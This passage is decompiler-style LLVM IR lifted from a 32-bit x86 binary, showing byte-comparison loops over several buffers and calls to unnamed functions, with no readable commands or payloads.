  %v0_804e18c = phi i32 [ %v0_804e18c.pre, %dec_label_pc_804e0e6 ], [ %v0_804e18c52, %dec_label_pc_804e297 ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ], [ %v0_804e18c52, %dec_label_pc_804e288 ]
  %v2_804e18c = add i32 %v1_804e18c, -4
  %v3_804e18c = inttoptr i32 %v2_804e18c to i32*
  store i32 %v0_804e18c, i32* %v3_804e18c, align 4
  %v1_804e18d = add i32 %v1_804e18c, -8
  %v2_804e18d = inttoptr i32 %v1_804e18d to i32*
  store i32 4096, i32* %v2_804e18d, align 4
  %v1_804e192 = add i32 %v1_804e18c, 56
  store i32 %v1_804e192, i32* %eax.global-to-local, align 4
  %v2_804e196 = add i32 %v1_804e18c, -12
  %v3_804e196 = inttoptr i32 %v2_804e196 to i32*
  store i32 %v1_804e192, i32* %v3_804e196, align 4
  %v1_804e197 = add i32 %v1_804e18c, 40
  %v2_804e197 = inttoptr i32 %v1_804e197 to i32*
  %v3_804e197 = load i32, i32* %v2_804e197, align 4
  store i32 %v3_804e197, i32* %eax.global-to-local, align 4
  %v2_804e19b = add i32 %v1_804e18c, -16
  %v3_804e19b = inttoptr i32 %v2_804e19b to i32*
  store i32 %v3_804e197, i32* %v3_804e19b, align 4
  %v5_804e19c = call i32 @function_805237c(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e19c, i32* %eax.global-to-local, align 4
  %v0_804e1a1 = load i32, i32* @esp, align 4
  store i32 %v5_804e19c, i32* @ebx, align 4
  %tmp114 = icmp slt i32 %v5_804e19c, 1
  br i1 %tmp114, label %dec_label_pc_804e397, label %dec_label_pc_804e1ae

dec_label_pc_804e1ae:                             ; preds = %dec_label_pc_804e18c
  %v1_804e1a1 = add i32 %v0_804e1a1, 16
  %v1_804e1ae = add i32 %v0_804e1a1, 8436
  %v2_804e1ae = inttoptr i32 %v1_804e1ae to i32*
  %v3_804e1ae = load i32, i32* %v2_804e1ae, align 4
  store i32 %v3_804e1ae, i32* %eax.global-to-local, align 4
  %v2_804e1b5 = inttoptr i32 %v1_804e1a1 to i32*
  store i32 %v3_804e1ae, i32* %v2_804e1b5, align 4
  %v0_804e1b8 = load i32, i32* @ebx, align 4
  %v1_804e1b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1b8 = sub i32 %v0_804e1b8, %v1_804e1b8
  %v8_804e1b8 = xor i32 %v1_804e1b8, %v0_804e1b8
  %v9_804e1b8 = xor i32 %v2_804e1b8, %v0_804e1b8
  %v10_804e1b8 = and i32 %v9_804e1b8, %v8_804e1b8
  %v11_804e1b8 = icmp slt i32 %v10_804e1b8, 0
  %v13_804e1b8 = icmp slt i32 %v2_804e1b8, 0
  %v2_804e1ba = icmp eq i1 %v13_804e1b8, %v11_804e1b8
  br i1 %v2_804e1ba, label %dec_label_pc_804e1bc, label %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge

dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge: ; preds = %dec_label_pc_804e1ae
  %v0_804e1e8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e1e8

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804e1ae
  %v0_804e1c1 = load i32, i32* @esp, align 4
  %v10_804e1c5 = icmp eq i32 %v0_804e1b8, 0
  br i1 %v10_804e1c5, label %dec_label_pc_804e1e8, label %dec_label_pc_804e1d0.preheader

dec_label_pc_804e1d0.preheader:                   ; preds = %dec_label_pc_804e1bc
  %v1_804e1c1 = add i32 %v0_804e1c1, 56
  %v1_804e1d0 = add i32 %v0_804e1c1, 36
  %v2_804e1d0 = inttoptr i32 %v1_804e1d0 to i32*
  %v1_804e2c1 = inttoptr i32 %v0_804e1c1 to i32*
  br label %dec_label_pc_804e1d0

dec_label_pc_804e1d0:                             ; preds = %dec_label_pc_804e1d0.preheader, %dec_label_pc_804e1e1
  %v0_804e1e1.in = phi i32 [ %v0_804e1e1, %dec_label_pc_804e1e1 ], [ %v0_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e2c0 = phi i32 [ %v3_804e1d661, %dec_label_pc_804e1e1 ], [ 0, %dec_label_pc_804e1d0.preheader ]
  %v4_804e1d4 = phi i32 [ %v6_804e1d4, %dec_label_pc_804e1e1 ], [ %v1_804e1b8, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e2 = phi i32 [ %v1_804e1e2, %dec_label_pc_804e1e1 ], [ %v1_804e1c1, %dec_label_pc_804e1d0.preheader ]
  %v0_804e1e1 = add i32 %v0_804e1e1.in, -1
  %v3_804e1d0 = load i32, i32* %v2_804e1d0, align 4
  store i32 %v3_804e1d0, i32* @edi, align 4
  %v1_804e1d4 = inttoptr i32 %v0_804e1e2 to i8*
  %v2_804e1d4 = load i8, i8* %v1_804e1d4, align 1
  %v3_804e1d4 = zext i8 %v2_804e1d4 to i32
  %v5_804e1d4 = and i32 %v4_804e1d4, -256
  %v6_804e1d4 = or i32 %v3_804e1d4, %v5_804e1d4
  store i32 %v6_804e1d4, i32* %eax.global-to-local, align 4
  %v4_804e1d6 = add i32 %v3_804e1d0, %v0_804e2c0
  %v5_804e1d6 = inttoptr i32 %v4_804e1d6 to i8*
  %v6_804e1d6 = load i8, i8* %v5_804e1d6, align 1
  %v17_804e1d6 = icmp eq i8 %v2_804e1d4, %v6_804e1d6
  br i1 %v17_804e1d6, label %dec_label_pc_804e2c0, label %dec_label_pc_804e1df

dec_label_pc_804e1df:                             ; preds = %dec_label_pc_804e1d0
  br label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e1df
  %v3_804e1d661 = phi i32 [ %v1_804e2c0, %dec_label_pc_804e2c0 ], [ 0, %dec_label_pc_804e1df ]
  %v1_804e1e2 = add i32 %v0_804e1e2, 1
  %v10_804e1e3 = icmp eq i32 %v0_804e1e1, 0
  %v1_804e1e6 = icmp eq i1 %v10_804e1e3, false
  br i1 %v1_804e1e6, label %dec_label_pc_804e1d0, label %dec_label_pc_804e1e8

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1e1, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge, %dec_label_pc_804e1bc
  %v0_804e1e8 = phi i32 [ %v0_804e1e8.pre, %dec_label_pc_804e1ae.dec_label_pc_804e1e8_crit_edge ], [ %v0_804e1c1, %dec_label_pc_804e1bc ], [ %v0_804e1c1, %dec_label_pc_804e1e1 ]
  %v1_804e1e8 = add i32 %v0_804e1e8, 8416
  %v2_804e1e8 = inttoptr i32 %v1_804e1e8 to i32*
  %v3_804e1e8 = load i32, i32* %v2_804e1e8, align 4
  store i32 %v3_804e1e8, i32* %eax.global-to-local, align 4
  %v2_804e1ef = inttoptr i32 %v0_804e1e8 to i32*
  store i32 %v3_804e1e8, i32* %v2_804e1ef, align 4
  %v0_804e1f2 = load i32, i32* @ebx, align 4
  %v1_804e1f2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1f2 = sub i32 %v0_804e1f2, %v1_804e1f2
  %v8_804e1f2 = xor i32 %v1_804e1f2, %v0_804e1f2
  %v9_804e1f2 = xor i32 %v2_804e1f2, %v0_804e1f2
  %v10_804e1f2 = and i32 %v9_804e1f2, %v8_804e1f2
  %v11_804e1f2 = icmp slt i32 %v10_804e1f2, 0
  %v13_804e1f2 = icmp slt i32 %v2_804e1f2, 0
  %v2_804e1f4 = icmp eq i1 %v13_804e1f2, %v11_804e1f2
  br i1 %v2_804e1f4, label %dec_label_pc_804e1f6, label %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge

dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge: ; preds = %dec_label_pc_804e1e8
  %v0_804e21c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e21c

dec_label_pc_804e1f6:                             ; preds = %dec_label_pc_804e1e8
  %v0_804e1fb = load i32, i32* @esp, align 4
  %v10_804e1ff = icmp eq i32 %v0_804e1f2, 0
  br i1 %v10_804e1ff, label %dec_label_pc_804e21c, label %dec_label_pc_804e204.preheader

dec_label_pc_804e204.preheader:                   ; preds = %dec_label_pc_804e1f6
  %v1_804e1fb = add i32 %v0_804e1fb, 56
  %v1_804e204 = add i32 %v0_804e1fb, 32
  %v2_804e204 = inttoptr i32 %v1_804e204 to i32*
  %v1_804e359 = inttoptr i32 %v0_804e1fb to i32*
  br label %dec_label_pc_804e204

dec_label_pc_804e204:                             ; preds = %dec_label_pc_804e204.preheader, %dec_label_pc_804e216
  %v0_804e216.in = phi i32 [ %v0_804e216, %dec_label_pc_804e216 ], [ %v0_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e358 = phi i32 [ %v3_804e20a69, %dec_label_pc_804e216 ], [ 0, %dec_label_pc_804e204.preheader ]
  %v4_804e208 = phi i32 [ %v6_804e208, %dec_label_pc_804e216 ], [ %v1_804e1f2, %dec_label_pc_804e204.preheader ]
  %v0_804e362 = phi i32 [ %v1_804e215, %dec_label_pc_804e216 ], [ %v1_804e1fb, %dec_label_pc_804e204.preheader ]
  %v0_804e216 = add i32 %v0_804e216.in, -1
  %v3_804e204 = load i32, i32* %v2_804e204, align 4
  store i32 %v3_804e204, i32* @edi, align 4
  %v1_804e208 = inttoptr i32 %v0_804e362 to i8*
  %v2_804e208 = load i8, i8* %v1_804e208, align 1
  %v3_804e208 = zext i8 %v2_804e208 to i32
  %v5_804e208 = and i32 %v4_804e208, -256
  %v6_804e208 = or i32 %v3_804e208, %v5_804e208
  store i32 %v6_804e208, i32* %eax.global-to-local, align 4
  %v4_804e20a = add i32 %v3_804e204, %v0_804e358
  %v5_804e20a = inttoptr i32 %v4_804e20a to i8*
  %v6_804e20a = load i8, i8* %v5_804e20a, align 1
  %v17_804e20a = icmp eq i8 %v2_804e208, %v6_804e20a
  br i1 %v17_804e20a, label %dec_label_pc_804e358, label %dec_label_pc_804e213

dec_label_pc_804e213:                             ; preds = %dec_label_pc_804e204
  br label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e358, %dec_label_pc_804e213
  %v3_804e20a69 = phi i32 [ 0, %dec_label_pc_804e213 ], [ %v1_804e358, %dec_label_pc_804e358 ]
  %v1_804e215 = add i32 %v0_804e362, 1
  %v10_804e217 = icmp eq i32 %v0_804e216, 0
  %v1_804e21a = icmp eq i1 %v10_804e217, false
  br i1 %v1_804e21a, label %dec_label_pc_804e204, label %dec_label_pc_804e21c

dec_label_pc_804e21c:                             ; preds = %dec_label_pc_804e216, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge, %dec_label_pc_804e1f6
  %v0_804e21c = phi i32 [ %v0_804e21c.pre, %dec_label_pc_804e1e8.dec_label_pc_804e21c_crit_edge ], [ %v0_804e1fb, %dec_label_pc_804e1f6 ], [ %v0_804e1fb, %dec_label_pc_804e216 ]
  %v1_804e21c = add i32 %v0_804e21c, 8412
  %v2_804e21c = inttoptr i32 %v1_804e21c to i32*
  %v3_804e21c = load i32, i32* %v2_804e21c, align 4
  store i32 %v3_804e21c, i32* %eax.global-to-local, align 4
  %v2_804e223 = inttoptr i32 %v0_804e21c to i32*
  store i32 %v3_804e21c, i32* %v2_804e223, align 4
  %v0_804e226 = load i32, i32* @ebx, align 4
  %v1_804e226 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e226 = sub i32 %v0_804e226, %v1_804e226
  %v8_804e226 = xor i32 %v1_804e226, %v0_804e226
  %v9_804e226 = xor i32 %v2_804e226, %v0_804e226
  %v10_804e226 = and i32 %v9_804e226, %v8_804e226
  %v11_804e226 = icmp slt i32 %v10_804e226, 0
  %v13_804e226 = icmp slt i32 %v2_804e226, 0
  %v2_804e228 = icmp eq i1 %v13_804e226, %v11_804e226
  br i1 %v2_804e228, label %dec_label_pc_804e22a, label %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge

dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge: ; preds = %dec_label_pc_804e21c
  %v0_804e250.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e250

dec_label_pc_804e22a:                             ; preds = %dec_label_pc_804e21c
  %v0_804e22f = load i32, i32* @esp, align 4
  %v10_804e233 = icmp eq i32 %v0_804e226, 0
  br i1 %v10_804e233, label %dec_label_pc_804e250, label %dec_label_pc_804e238.preheader

dec_label_pc_804e238.preheader:                   ; preds = %dec_label_pc_804e22a
  %v1_804e22f = add i32 %v0_804e22f, 56
  %v1_804e238 = add i32 %v0_804e22f, 28
  %v2_804e238 = inttoptr i32 %v1_804e238 to i32*
  %v1_804e369 = inttoptr i32 %v0_804e22f to i32*
  br label %dec_label_pc_804e238

dec_label_pc_804e238:                             ; preds = %dec_label_pc_804e238.preheader, %dec_label_pc_804e24a
  %v0_804e24a.in = phi i32 [ %v0_804e24a, %dec_label_pc_804e24a ], [ %v0_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e368 = phi i32 [ %v3_804e23e77, %dec_label_pc_804e24a ], [ 0, %dec_label_pc_804e238.preheader ]
  %v4_804e23c = phi i32 [ %v6_804e23c, %dec_label_pc_804e24a ], [ %v1_804e226, %dec_label_pc_804e238.preheader ]
  %v0_804e372 = phi i32 [ %v1_804e249, %dec_label_pc_804e24a ], [ %v1_804e22f, %dec_label_pc_804e238.preheader ]
  %v0_804e24a = add i32 %v0_804e24a.in, -1
  %v3_804e238 = load i32, i32* %v2_804e238, align 4
  store i32 %v3_804e238, i32* @edi, align 4
  %v1_804e23c = inttoptr i32 %v0_804e372 to i8*
  %v2_804e23c = load i8, i8* %v1_804e23c, align 1
  %v3_804e23c = zext i8 %v2_804e23c to i32
  %v5_804e23c = and i32 %v4_804e23c, -256
  %v6_804e23c = or i32 %v3_804e23c, %v5_804e23c
  store i32 %v6_804e23c, i32* %eax.global-to-local, align 4
  %v4_804e23e = add i32 %v3_804e238, %v0_804e368
  %v5_804e23e = inttoptr i32 %v4_804e23e to i8*
  %v6_804e23e = load i8, i8* %v5_804e23e, align 1
  %v17_804e23e = icmp eq i8 %v2_804e23c, %v6_804e23e
  br i1 %v17_804e23e, label %dec_label_pc_804e368, label %dec_label_pc_804e247

dec_label_pc_804e247:                             ; preds = %dec_label_pc_804e238
  br label %dec_label_pc_804e24a

dec_label_pc_804e24a:                             ; preds = %dec_label_pc_804e368, %dec_label_pc_804e247
  %v3_804e23e77 = phi i32 [ 0, %dec_label_pc_804e247 ], [ %v1_804e368, %dec_label_pc_804e368 ]
  %v1_804e249 = add i32 %v0_804e372, 1
  %v10_804e24b = icmp eq i32 %v0_804e24a, 0
  %v1_804e24e = icmp eq i1 %v10_804e24b, false
  br i1 %v1_804e24e, label %dec_label_pc_804e238, label %dec_label_pc_804e250

dec_label_pc_804e250:                             ; preds = %dec_label_pc_804e24a, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge, %dec_label_pc_804e22a
  %v0_804e250 = phi i32 [ %v0_804e250.pre, %dec_label_pc_804e21c.dec_label_pc_804e250_crit_edge ], [ %v0_804e22f, %dec_label_pc_804e22a ], [ %v0_804e22f, %dec_label_pc_804e24a ]
  %v1_804e250 = add i32 %v0_804e250, 8424
  %v2_804e250 = inttoptr i32 %v1_804e250 to i32*
  %v3_804e250 = load i32, i32* %v2_804e250, align 4
  store i32 %v3_804e250, i32* %eax.global-to-local, align 4
  %v2_804e257 = inttoptr i32 %v0_804e250 to i32*
  store i32 %v3_804e250, i32* %v2_804e257, align 4
  %v0_804e25a = load i32, i32* @ebx, align 4
  %v1_804e25a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e25a = sub i32 %v0_804e25a, %v1_804e25a
  %v8_804e25a = xor i32 %v1_804e25a, %v0_804e25a
  %v9_804e25a = xor i32 %v2_804e25a, %v0_804e25a
  %v10_804e25a = and i32 %v9_804e25a, %v8_804e25a
  %v11_804e25a = icmp slt i32 %v10_804e25a, 0
  %v13_804e25a = icmp slt i32 %v2_804e25a, 0
  %v2_804e25c = icmp eq i1 %v13_804e25a, %v11_804e25a
  br i1 %v2_804e25c, label %dec_label_pc_804e25e, label %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge

dec_label_pc_804e250.dec_label_pc_804e288_crit_edge: ; preds = %dec_label_pc_804e250
  %v0_804e288.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e288

dec_label_pc_804e25e:                             ; preds = %dec_label_pc_804e250
  %v0_804e263 = load i32, i32* @esp, align 4
  %v10_804e267 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e267, label %dec_label_pc_804e288, label %dec_label_pc_804e270.preheader

dec_label_pc_804e270.preheader:                   ; preds = %dec_label_pc_804e25e
  %v1_804e263 = add i32 %v0_804e263, 56
  %v1_804e270 = add i32 %v0_804e263, 24
  %v2_804e270 = inttoptr i32 %v1_804e270 to i32*
  %v1_804e379 = inttoptr i32 %v0_804e263 to i32*
  br label %dec_label_pc_804e270

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e270.preheader, %dec_label_pc_804e282
  %v0_804e282.in = phi i32 [ %v0_804e282, %dec_label_pc_804e282 ], [ %v0_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e378 = phi i32 [ %v3_804e27685, %dec_label_pc_804e282 ], [ 0, %dec_label_pc_804e270.preheader ]
  %v4_804e274 = phi i32 [ %v6_804e274, %dec_label_pc_804e282 ], [ %v1_804e25a, %dec_label_pc_804e270.preheader ]
  %v0_804e382 = phi i32 [ %v1_804e281, %dec_label_pc_804e282 ], [ %v1_804e263, %dec_label_pc_804e270.preheader ]
  %v0_804e282 = add i32 %v0_804e282.in, -1
  %v3_804e270 = load i32, i32* %v2_804e270, align 4
  store i32 %v3_804e270, i32* @edi, align 4
  %v1_804e274 = inttoptr i32 %v0_804e382 to i8*
  %v2_804e274 = load i8, i8* %v1_804e274, align 1
  %v3_804e274 = zext i8 %v2_804e274 to i32
  %v5_804e274 = and i32 %v4_804e274, -256
  %v6_804e274 = or i32 %v3_804e274, %v5_804e274
  store i32 %v6_804e274, i32* %eax.global-to-local, align 4
  %v4_804e276 = add i32 %v3_804e270, %v0_804e378
  %v5_804e276 = inttoptr i32 %v4_804e276 to i8*
  %v6_804e276 = load i8, i8* %v5_804e276, align 1
  %v17_804e276 = icmp eq i8 %v2_804e274, %v6_804e276
  br i1 %v17_804e276, label %dec_label_pc_804e378, label %dec_label_pc_804e27f

dec_label_pc_804e27f:                             ; preds = %dec_label_pc_804e270
  br label %dec_label_pc_804e282

dec_label_pc_804e282:                             ; preds = %dec_label_pc_804e378, %dec_label_pc_804e27f
  %v3_804e27685 = phi i32 [ 0, %dec_label_pc_804e27f ], [ %v1_804e378, %dec_label_pc_804e378 ]
  %v1_804e281 = add i32 %v0_804e382, 1
  %v10_804e283 = icmp eq i32 %v0_804e282, 0
  %v1_804e286 = icmp eq i1 %v10_804e283, false
  br i1 %v1_804e286, label %dec_label_pc_804e270, label %dec_label_pc_804e288

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e282, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge, %dec_label_pc_804e25e
  %v0_804e297 = phi i32 [ %v0_804e288.pre, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v0_804e263, %dec_label_pc_804e25e ], [ %v0_804e263, %dec_label_pc_804e282 ]
  %v0_804e18c52 = phi i32 [ %v1_804e25a, %dec_label_pc_804e250.dec_label_pc_804e288_crit_edge ], [ %v1_804e25a, %dec_label_pc_804e25e ], [ %v6_804e274, %dec_label_pc_804e282 ]
  %v1_804e288 = add i32 %v0_804e297, 8408
  %v2_804e288 = inttoptr i32 %v1_804e288 to i32*
  %v3_804e288 = load i32, i32* %v2_804e288, align 4
  %v2_804e28f = sub i32 %v0_804e25a, %v3_804e288
  %v8_804e28f = xor i32 %v3_804e288, %v0_804e25a
  %v9_804e28f = xor i32 %v2_804e28f, %v0_804e25a
  %v10_804e28f = and i32 %v9_804e28f, %v8_804e28f
  %v11_804e28f = icmp slt i32 %v10_804e28f, 0
  %v13_804e28f = icmp slt i32 %v2_804e28f, 0
  %v2_804e291 = icmp eq i1 %v13_804e28f, %v11_804e28f
  br i1 %v2_804e291, label %dec_label_pc_804e297, label %dec_label_pc_804e18c

dec_label_pc_804e297:                             ; preds = %dec_label_pc_804e288
  %v1_804e2a0126 = add i32 %v0_804e25a, -1
  store i32 %v1_804e2a0126, i32* @ebx, align 4
  %v10_804e2a1127 = icmp eq i32 %v0_804e25a, 0
  br i1 %v10_804e2a1127, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa.lr.ph

dec_label_pc_804e2aa.lr.ph:                       ; preds = %dec_label_pc_804e297
  %v1_804e297 = add i32 %v0_804e297, 56
  %v1_804e2aa = add i32 %v0_804e297, 20
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  br label %dec_label_pc_804e2aa

dec_label_pc_804e2aa:                             ; preds = %dec_label_pc_804e2aa.lr.ph, %dec_label_pc_804e2a0.backedge
  %v1_804e2a0131 = phi i32 [ %v1_804e2a0126, %dec_label_pc_804e2aa.lr.ph ], [ %v1_804e2a0, %dec_label_pc_804e2a0.backedge ]
  %v4_804e2ae130 = phi i32 [ %v0_804e18c52, %dec_label_pc_804e2aa.lr.ph ], [ %v6_804e2ae, %dec_label_pc_804e2a0.backedge ]
  %v0_804e391129 = phi i32 [ %v1_804e297, %dec_label_pc_804e2aa.lr.ph ], [ %storemerge32.in, %dec_label_pc_804e2a0.backedge ]
  %v0_804e388128 = phi i32 [ 0, %dec_label_pc_804e2aa.lr.ph ], [ %v3_804e2b091, %dec_label_pc_804e2a0.backedge ]
  %v3_804e2aa = load i32, i32* %v2_804e2aa, align 4
  store i32 %v3_804e2aa, i32* @edi, align 4
  %v1_804e2ae = inttoptr i32 %v0_804e391129 to i8*
  %v2_804e2ae = load i8, i8* %v1_804e2ae, align 1
  %v3_804e2ae = zext i8 %v2_804e2ae to i32
  %v5_804e2ae = and i32 %v4_804e2ae130, -256
  %v6_804e2ae = or i32 %v3_804e2ae, %v5_804e2ae
  store i32 %v6_804e2ae, i32* %eax.global-to-local, align 4
  %v4_804e2b0 = add i32 %v3_804e2aa, %v0_804e388128
  %v5_804e2b0 = inttoptr i32 %v4_804e2b0 to i8*
  %v6_804e2b0 = load i8, i8* %v5_804e2b0, align 1
  %v17_804e2b0 = icmp eq i8 %v2_804e2ae, %v6_804e2b0
  br i1 %v17_804e2b0, label %dec_label_pc_804e388, label %dec_label_pc_804e2b9

dec_label_pc_804e2b9:                             ; preds = %dec_label_pc_804e2aa
  br label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2c0:                             ; preds = %dec_label_pc_804e1d0
  %v1_804e2c0 = add i32 %v0_804e2c0, 1
  %v2_804e2c1 = load i32, i32* %v1_804e2c1, align 4
  %v14_804e2c1 = icmp eq i32 %v2_804e2c1, %v1_804e2c0
  %v1_804e2c4 = icmp eq i1 %v14_804e2c1, false
  br i1 %v1_804e2c4, label %dec_label_pc_804e1e1, label %dec_label_pc_804e2ca

dec_label_pc_804e2ca:                             ; preds = %dec_label_pc_804e2c0, %dec_label_pc_804e358, %dec_label_pc_804e368, %dec_label_pc_804e378, %dec_label_pc_804e388
  %v0_804e2ca = phi i32 [ %v0_804e297, %dec_label_pc_804e388 ], [ %v0_804e263, %dec_label_pc_804e378 ], [ %v0_804e22f, %dec_label_pc_804e368 ], [ %v0_804e1fb, %dec_label_pc_804e358 ], [ %v0_804e1c1, %dec_label_pc_804e2c0 ]
  %v1_804e2cd = add i32 %v0_804e2ca, -16
  %v2_804e2cd = inttoptr i32 %v1_804e2cd to i32*
  store i32 12, i32* %v2_804e2cd, align 4
  %v2_804e2cf = call i32 @function_8051270(i8 0)
  store i32 %v2_804e2cf, i32* %eax.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @esp, align 4
  %v1_804e2d4 = inttoptr i32 %v0_804e2d4 to i32*
  store i32 13, i32* %v1_804e2d4, align 4
  %v2_804e2db = call i32 @function_8051270(i8 0)
  store i32 %v2_804e2db, i32* %eax.global-to-local, align 4
  %v0_804e2e0 = load i32, i32* @esp, align 4
  %v1_804e2e0 = inttoptr i32 %v0_804e2e0 to i32*
  store i32 14, i32* %v1_804e2e0, align 4
  %v2_804e2e7 = call i32 @function_8051270(i8 0)
  store i32 %v2_804e2e7, i32* %eax.global-to-local, align 4
  %v0_804e2ec = load i32, i32* @esp, align 4
  %v1_804e2ec = inttoptr i32 %v0_804e2ec to i32*
  store i32 15, i32* %v1_804e2ec, align 4
  %v2_804e2f3 = call i32 @function_8051270(i8 0)
  store i32 %v2_804e2f3, i32* %eax.global-to-local, align 4
  %v0_804e2f8 = load i32, i32* @esp, align 4
  %v1_804e2f8 = inttoptr i32 %v0_804e2f8 to i32*
  store i32 16, i32* %v1_804e2f8, align 4
  %v2_804e2ff = call i32 @function_8051270(i8 0)
  store i32 %v2_804e2ff, i32* %eax.global-to-local, align 4
  %v0_804e304 = load i32, i32* @esp, align 4
  %v1_804e304 = inttoptr i32 %v0_804e304 to i32*
  %v2_804e304 = load i32, i32* %v1_804e304, align 4
  store i32 %v2_804e304, i32* %eax.global-to-local, align 4
  %v1_804e305 = add i32 %v0_804e304, 56
  %v2_804e305 = inttoptr i32 %v1_804e305 to i32*
  %v3_804e305 = load i32, i32* %v2_804e305, align 4
  store i32 %v3_804e305, i32* @edi, align 4
  store i32 %v3_804e305, i32* %v1_804e304, align 4
  %v1_804e30a = call i32 @function_80521e1(i32 0)
  store i32 %v1_804e30a, i32* %eax.global-to-local, align 4
  %v0_804e30f = load i32, i32* @esp, align 4
  %v1_804e30f = inttoptr i32 %v0_804e30f to i32*
  %v2_804e30f = load i32, i32* %v1_804e30f, align 4
  store i32 %v2_804e30f, i32* @ebx, align 4
  %v3_804e30f = add i32 %v0_804e30f, 4
  %v1_804e310 = inttoptr i32 %v3_804e30f to i32*
  store i32 9, i32* %v1_804e310, align 4
  %v0_804e313 = load i32, i32* @ebp, align 4
  store i32 %v0_804e313, i32* %v1_804e30f, align 4
  %v4_804e314 = call i32 @function_80522c0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e314, i32* @eax, align 4
  %v0_804e319 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

dec_label_pc_804e31c:                             ; preds = %dec_label_pc_804e0c7, %dec_label_pc_804e397, %dec_label_pc_804e2ca
  %v1_804e31c.in = phi i32 [ %v0_804e0dc, %dec_label_pc_804e0c7 ], [ %v0_804e3dc, %dec_label_pc_804e397 ], [ %v0_804e319, %dec_label_pc_804e2ca ]
  %v0_804e31c = load i32, i32* @ecx, align 4
  %v2_804e31c = add i32 %v1_804e31c.in, 12
  %v3_804e31c = inttoptr i32 %v2_804e31c to i32*
  store i32 %v0_804e31c, i32* %v3_804e31c, align 4
  %v0_804e31d = load i32, i32* @ecx, align 4
  %v2_804e31d = add i32 %v1_804e31c.in, 8
  %v3_804e31d = inttoptr i32 %v2_804e31d to i32*
  store i32 %v0_804e31d, i32* %v3_804e31d, align 4
  %v1_804e31e = add i32 %v1_804e31c.in, 4
  %v2_804e31e = inttoptr i32 %v1_804e31e to i32*
  store i32 64, i32* %v2_804e31e, align 4
  %v0_804e320 = load i32, i32* @ebp, align 4
  store i32 %v0_804e320, i32* @esi, align 4
  %v1_804e322 = add i32 %v1_804e31c.in, 8328
  store i32 %v1_804e322, i32* @edi, align 4
  %v3_804e329 = inttoptr i32 %v1_804e31c.in to i32*
  store i32 %v1_804e322, i32* %v3_804e329, align 4
  %v2_804e32a = call i32 @function_8051cd0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e32a, i32* %eax.global-to-local, align 4
  %v0_804e32f = load i32, i32* @esp, align 4
  %v1_804e32f = inttoptr i32 %v0_804e32f to i32*
  %v2_804e32f = load i32, i32* %v1_804e32f, align 4
  store i32 %v2_804e32f, i32* %eax.global-to-local, align 4
  %v3_804e32f = add i32 %v0_804e32f, 4
  %v1_804e330 = inttoptr i32 %v3_804e32f to i32*
  store i32 64, i32* %v1_804e330, align 4
  %v1_804e333 = add i32 %v0_804e32f, 8264
  store i32 %v1_804e333, i32* @eax, align 4
  store i32 %v1_804e333, i32* %v1_804e32f, align 4
  %v2_804e33b = call i32 @function_8051cd0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e33b, i32* %eax.global-to-local, align 4
  %v0_804e340 = load i32, i32* @esp, align 4
  %v1_804e340 = inttoptr i32 %v0_804e340 to i32*
  store i32 1, i32* %v1_804e340, align 4
  %v1_804e347 = call i32 @function_8053d90(i32 0)
  store i32 %v1_804e347, i32* %eax.global-to-local, align 4
  %v0_804e34c = load i32, i32* @esp, align 4
  %v1_804e34c = add i32 %v0_804e34c, 24
  %v2_804e34c = inttoptr i32 %v1_804e34c to i32*
  %v3_804e34c = load i32, i32* %v2_804e34c, align 4
  store i32 %v3_804e34c, i32* @ebx, align 4
  %v1_804e350 = add i32 %v0_804e34c, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e358:                             ; preds = %dec_label_pc_804e204
  %v1_804e358 = add i32 %v0_804e358, 1
  %v2_804e359 = load i32, i32* %v1_804e359, align 4
  %v14_804e359 = icmp eq i32 %v2_804e359, %v1_804e358
  br i1 %v14_804e359, label %dec_label_pc_804e2ca, label %dec_label_pc_804e216

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e238
  %v1_804e368 = add i32 %v0_804e368, 1
  %v2_804e369 = load i32, i32* %v1_804e369, align 4
